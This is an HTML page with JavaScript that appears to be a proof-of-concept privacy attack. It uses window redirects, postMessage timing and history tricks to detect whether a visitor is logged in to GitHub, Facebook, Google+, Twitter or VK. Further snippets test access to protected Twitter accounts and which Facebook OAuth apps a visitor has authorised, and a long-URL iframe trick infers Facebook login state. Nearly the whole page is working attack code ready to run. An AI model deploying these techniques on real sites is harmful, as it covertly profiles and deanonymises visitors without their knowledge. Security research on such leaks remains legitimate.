<h1>URL and redirection detection</h1>
<script>

var wins = []
var timeout = 9000;
var direct_history = false;
var data_timeout = 2000;
var full_debug = false;

window.onmessage=function(e){
  var guess = e.data.result == '2';
  var id = parseInt(e.data.id);

  if(full_debug) debug('Received: '+ guess + ' for '+id)

  if(wins[id].started){
    if(full_debug){
      debug('Processing time (ms): '+ (new Date - wins[id].started))
    }

    wins[id].cb(guess);
    //optional
    //wins[e.data.id].w.close()
    //http://www.whatwg.org/specs/web-apps/current-work/#security-window
    //wins[e.data.id].w.history.go(guess ? 1 : 2)
  }
}
var debug=function(d){
  deb.innerText=deb.innerText+"<br>"+d;
}

var path_for = function(data){
  return '/postback.html?'+data;
  //'data:text/html,<script>opener.postMessage({result: false,id:'+id+'},"*")<'+'/script>'
}

var check_redirect = function(base, cb, assigner){
  var id = wins.length;

  wins[id] = {
    w: window.open(path_for('1,'+id)),
    started: false,
    cb: cb
  }

  setTimeout(function(){
    wins[id].w.location=path_for('2,'+id);
  },data_timeout)

  setTimeout(function(){
    wins[id].w.location = base;

    setTimeout(function(){
      wins[id].started = new Date;
      if(full_debug) debug('Started at '+ wins[id].started);

      if(assigner){
        assigner(wins[id].w);
      }else{
        // check exactly same URL
        wins[id].w.location = base+'#';
      }
      setTimeout(function(){
        if(direct_history){
          wins[id].w.history.go(-2);
        }else{
          wins[id].w.location = path_for('3')
        }
      },100)
    },timeout)
  },data_timeout*2)
}

var run = function(){
  window.eval(ev.value)
}

//window.onload = run;

</script>

<br><a href=javascript:void(0) onclick="run()">Run</a>
<br>
<textarea id="ev" style="width:600px;height:200px;">

check_redirect('https://github.com/notifications', function(guess){
  debug('Logged in on github: '+ (guess ? 'yes' : 'no'));
})

check_redirect('https://www.facebook.com/messages/new', function(guess){
  debug('Logged in on fb: '+ (guess ? 'yes' : 'no'));
})

check_redirect('https://plus.google.com/photos/instantupload', function(guess){
  debug('Logged in on google+: '+ (guess ? 'yes' : 'no'));
})

check_redirect('https://twitter.com/following', function(guess){
  debug('Logged in on twitter: '+ (guess ? 'yes' : 'no'));
})

check_redirect('http://vk.com/friends', function(guess){
  debug('Logged in on vk: '+ (guess ? 'yes' : 'no'));
})


</textarea>

<b><div id="deb"></div></b>

<pre>
Other examples (you can copy code to textarea and press Run or simply use firebug/web inspector):


check_redirect('https://twitter.com/PROTECTED/favorites', function(guess){
  debug('Has access to protected account: '+ (guess ? 'yes' : 'no'));
})

check_redirect('https://www.facebook.com/dialog/oauth?client_id='+(tryapp=prompt('choose app, e.g. 114545895322903'))+'&redirect_uri=https%3A%2F%2Fm.facebook.com', function(guess){
  debug('Authorized app '+tryapp+'  '+(guess ? 'no' : 'yes'));
})
</pre>
<hr/>
<h1>Clickjacking URL-change detection</h1>



<hr/>
<h1>414 and X-Frame-Options based detection</h1>
<pre>
var a='';
for(var i=0;i<50000;i++){a+='=';}

var wait = setTimeout(function(){
  alert('Logged in fb')
},15000)

var cb=function(){
  clearTimeout(wait);
  alert('Not logged in fb');
}

a='https://www.facebook.com/messages/new?'+a;
console.log(a.length);
document.write('<'+'iframe onload="cb()" src="'+a+'"><'+'/iframe>')
</pre>
